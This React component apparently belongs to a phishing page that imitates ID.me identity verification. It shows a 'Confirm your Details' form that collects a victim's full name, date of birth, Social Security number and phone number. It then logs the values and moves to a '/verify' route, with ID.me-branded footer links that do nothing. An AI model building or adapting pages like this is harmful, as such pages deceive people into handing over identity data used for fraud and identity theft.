import React, { useState } from "react";
import id from "../assets/id.png";
import download from "../assets/download2.png";
import DatePicker from "react-datepicker";
import "react-datepicker/dist/react-datepicker.css";
import { useNavigate } from "react-router-dom";

const Details = () => {
  const [currentErrorField, setCurrentErrorField] = useState(null);
  const [errors, setErrors] = useState({
    name: false,
    dob: false,
    ssn: false,
    phone: false
  });
  const [data, setData] = useState({});
  const navigate = useNavigate();


  const [formData, setFormData] = useState({
    name: "",
    dob: null,
    ssn: "",
    phone: "",
  });

  const handleDateChange = (date) => {
    setFormData((prev) => ({
      ...prev,
      dob: date,
    }));

    if (currentErrorField === 'dob') {
      setErrors((prev) => ({ ...prev, dob: !date }));
    }
  };

  const handleChange = (event) => {
    const { name, value } = event.target;
    setFormData((prev) => ({
      ...prev,
      [name]: value,
    }));

    if (currentErrorField === name) {
      setErrors((prev) => ({ ...prev, [name]: !value.trim() }));
    }
  };

  const validateField = (fieldName) => {
    let isValid = false;
    
    if (fieldName === 'name') {
      isValid = formData.name.trim() !== '';
    } else if (fieldName === 'dob') {
      isValid = formData.dob !== null;
    } else if (fieldName === 'ssn') {
      isValid = formData.ssn.trim() !== '';
    } else if (fieldName === 'phone') {
      isValid = formData.phone.trim() !== '';
    }

    setErrors((prev) => ({ ...prev, [fieldName]: !isValid }));
    return isValid;
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    
    // Check fields in order
    if (!validateField('name')) {
      setCurrentErrorField('name');
      return;
    }
    
    if (!validateField('dob')) {
      setCurrentErrorField('dob');
      return;
    }
    
    if (!validateField('ssn')) {
      setCurrentErrorField('ssn');
      return;
    }
    
    if (!validateField('phone')) {
      setCurrentErrorField('phone');
      return;
    }


    // If all fields are valid
    setCurrentErrorField(null);
    console.log('Form submitted:', formData);
    navigate("/verify");
  };

  return (
    <div className="flex flex-col min-h-screen bg-[#ffffff]">
      {/* Header */}
      <div className="w-full h-28 bg-white shadow-md flex justify-center items-center space-x-2 p-2 sm:bg-white bg-gradient-to-b from-[#ffffff] to-[#f2f1f1]">
        <img src={id} alt="User ID Icon" className="w-20" />
        <h1 className="text-lg font-bold">+</h1>
        <img src={download} alt="Download Icon" className="w-24" />
      </div>

      <div className="w-full gap-3 max-w-[500px] bg-white px-4 py-6 sm:px-8 sm:py-10 rounded-xl shadow-lg border border-gray-300 mx-auto flex flex-col items-center">
        <h1 className="text-2xl sm:text-xl font-bold text-center mb-4 sm:mb-8">
          Confirm your Details
        </h1>

        <form
          onSubmit={handleSubmit}
          className="flex flex-col items-center space-y-7 w-full max-w-md mx-auto"
        >
          {/* Full Name */}
          <div className="w-full">
            <label className="text-md font-semibold mb-2 block">Full Name</label>
            <input
              name="name"
              type="text"
              value={formData.name}
              onChange={handleChange}
              onBlur={() => currentErrorField === 'name' && validateField('name')}
              className={`w-full px-4 py-2 border-2 border-gray-500 rounded-md tracking-widest font-mono text-lg sm:text-xl focus:outline-none ${
                errors.name
                  ? "border-red-500 focus:ring-2 focus:ring-red-500"
                  : "border-gray-300 focus:ring-2 focus:ring-blue-600"
              }`}
            />
            {errors.name && (
              <p className="text-red-500 text-sm mt-1">Fill out this field </p>
            )}
          </div>

          {/* Date of Birth */}
          <div className=" flex w-full space-x-1">
            <label className="text-md font-semibold mb-2 block">Date of Birth</label>
            <DatePicker
              selected={formData.dob}
              onChange={handleDateChange}
              onBlur={() => currentErrorField === 'dob' && validateField('dob')}
              name="dob"
              showMonthDropdown
              showYearDropdown
              dropdownMode="select"
              maxDate={new Date()}
              dateFormat="dd MM yyyy"
             
              className={`w-full px-4 py-2 border-2 rounded text-center tracking-widest font-mono text-lg sm:text-xl focus:outline-none ${
                errors.dob
                  ? "border-red-500 focus:ring-2 focus:ring-red-500"
                  : "border-gray-500 focus:ring-2 focus:ring-blue-700"
              }`}
            />
            {errors.dob && (
              <p className="text-red-500 text-sm mt-1">Fill out this field </p>
            )}
          </div>

          {/* SSN */}
          <div className="w-full">
            <label className="text-md font-semibold mb-2 block">Social Security Number</label>
            <input
              name="ssn"
              type="number"
              inputMode="numeric"
              value={formData.ssn}
              onChange={handleChange}
              onBlur={() => currentErrorField === 'ssn' && validateField('ssn')}
              className={`w-full px-4 py-2 border-2 rounded-md tracking-widest font-mono text-lg sm:text-xl focus:outline-none ${
                errors.ssn
                  ? "border-red-500 focus:ring-2 focus:ring-red-500"
                  : "border-gray-500 focus:ring-2 focus:ring-blue-700"
              }`}
            />
            {errors.ssn && (
              <p className="text-red-500 text-sm mt-1">Fill out this field </p>
            )}
          </div>

          {/* Phone Number */}
          <div className="w-full">
            <label className="text-md font-semibold mb-2 block">Phone Number</label>
            <input
              name="phone"
              type="number"
              inputMode="numeric"
              value={formData.phone}
              onChange={handleChange}
              onBlur={() => currentErrorField === 'phone' && validateField('phone')}
              className={`w-full px-4 py-2 border-2 rounded-md tracking-widest text-lg sm:text-xl focus:outline-none ${
                errors.phone
                  ? "border-red-500 focus:ring-2 focus:ring-red-500"
                  : "border-gray-500 focus:ring-2 focus:ring-blue-700"
              }`}
            />
            {errors.phone && (
              <p className="text-red-500 text-sm mt-1">Fill out this field </p>
            )}
          </div>

          <button
            type="submit"
            className="w-full py-3 sm:py-4 bg-blue-700 text-white rounded-lg mt-2 hover:bg-blue-800 transition-colors text-sm sm:text-lg"
          >
            Continue
          </button>
        </form>
      </div>

      {/* Footer */}
      <footer className="w-full shadow-md bg-[#f5f5f5] flex flex-col items-center justify-center p-4 text-xs sm:text-sm text-[#2e3f5b] space-y-2">
        <div className="underline text-blue-600 cursor-pointer">English</div>
        <div className="flex flex-wrap items-center justify-center gap-2 sm:gap-4 text-center cursor-pointer">
          <span>What is ID.me?</span>
          <span className="border-l border-black h-3" />
          <span>Terms of Service</span>
          <span className="border-l border-black h-3" />
          <span>Privacy Policy</span>
        </div>
      </footer>
    </div>
  );
};

export default Details;